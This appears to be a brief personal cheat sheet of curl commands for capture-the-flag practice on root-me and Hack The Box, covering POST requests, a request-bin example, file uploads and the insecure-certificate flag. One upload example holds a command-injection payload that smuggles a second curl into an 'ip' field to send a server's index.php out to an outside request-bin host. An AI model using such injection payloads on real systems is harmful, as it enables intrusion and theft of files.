# curl

## Post exemple:

```sh
curl -X POST -d name=value http://challenge01.root-me.org/web-serveur/ch53/index.php
curl http://admin.academy.htb:31817/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
```

## requestbin exemple:

```sh
curl -d '{ "name": "Princess Leia" }' \
  -H "Content-Type: application/json" \
  https://enirdd6d0146.x.pipedream.net/
```

## upload data:

```sh
 curl -d "@data.txt" -X POST http://localhost:3000/data
 exemple avec injection de commande:
 curl -X POST -d 'ip=127.0.0.1%0acurl -X POST -d @index.php https://enzuva1p723tj.x.pipedream.net' http://challenge01.root-me.org/web-serveur/ch53/index.php
```
 
# Certificat non legitime

-k OU --insecure


